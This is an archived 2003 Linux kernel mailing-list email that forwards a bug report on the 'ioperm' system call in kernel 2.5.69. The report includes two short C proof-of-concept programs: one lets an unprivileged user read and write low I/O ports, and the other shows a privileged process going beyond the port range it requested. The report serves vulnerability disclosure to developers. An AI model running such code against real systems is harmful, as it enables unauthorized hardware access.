Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261906AbTELFFO (ORCPT <rfc822;willy@w.ods.org>);
	Mon, 12 May 2003 01:05:14 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261907AbTELFFN
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 12 May 2003 01:05:13 -0400
Received: from franka.aracnet.com ([216.99.193.44]:64474 "EHLO
	franka.aracnet.com") by vger.kernel.org with ESMTP id S261906AbTELFFL
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 12 May 2003 01:05:11 -0400
Date: Sun, 11 May 2003 20:03:33 -0700
From: "Martin J. Bligh" <mbligh@aracnet.com>
To: linux-kernel <linux-kernel@vger.kernel.org>
Subject: [Bug 703] New: Security vulnerability in "ioperm" system call
Message-ID: <17400000.1052708613@[10.10.2.4]>
X-Mailer: Mulberry/2.2.1 (Linux/x86)
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

http://bugme.osdl.org/show_bug.cgi?id=703

           Summary: Security vulnerability in "ioperm" system call
    Kernel Version: 2.5.69
            Status: NEW
          Severity: low
             Owner: mbligh@aracnet.com
         Submitter: dave_matthew@yahoo.com


Distribution:
Debian 3.0

Hardware Environment:
processor       : 0
vendor_id       : GenuineIntel
cpu family      : 6
model           : 7
model name      : Pentium III (Katmai)
stepping        : 2
cpu MHz         : 498.866
cache size      : 512 KB
fdiv_bug        : no
hlt_bug         : no
f00f_bug        : no
coma_bug        : no
fpu             : yes
fpu_exception   : yes
cpuid level     : 2
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 sep mtrr pge mca cmov pat
pse36 mmx fxsr sse
bogomips        : 992.87

Software Environment:
Gnu C                  2.95.4
Gnu make               3.79.1
util-linux             2.11n
mount                  2.11n
modutils               2.4.15
e2fsprogs              1.27
Linux C Library        2.2.5
Dynamic linker (ldd)   2.2.5
Procps                 2.0.7
Net-tools              1.60
Console-tools          0.2.3
Sh-utils               2.0.11

Problem Description:
The "ioperm" system call allows an unprivileged user to gain read and write
access to I/O ports on the system.  When used by a privileged process, the
"ioperm" system call also fails to properly restrict privileges.

Steps to reproduce:
Example One -- The following program when run as an unprivileged user will
allow him or her to read from or write to I/O ports with addresses which are
below 0x3ff (1023).

# include <stdio.h>
# include <sys/io.h>
# include <stdlib.h>

int main(int argc, char **argv)
{
        if (argc < 2) {
                (void) fprintf(stderr, "Usage: %s PORT [VALUE]\n", argv[0]);
                return (2);
        }

        if (ioperm(1023, 1, 0) == -1) {
                perror("ioperm");
                return (1);
        }

        if (argc < 3) {
                (void) printf("0x%02x\n", inb(atoi(argv[1])));
        } else {
                outb(atoi(argv[2]), atoi(argv[1]));
        }

        return (0);
}

Example Two -- This next program when run as a privileged user demonstrates
how "ioperm" fails to properly restrict privileges.

# include <sys/io.h>
# include <stdio.h>

int main(void)
{
        if (ioperm(888, 1, 1) == -1) {
                perror("ioperm");
                return (1);
        }

        (void) printf("0x%02x\n", inb(889));
        return (0);
}

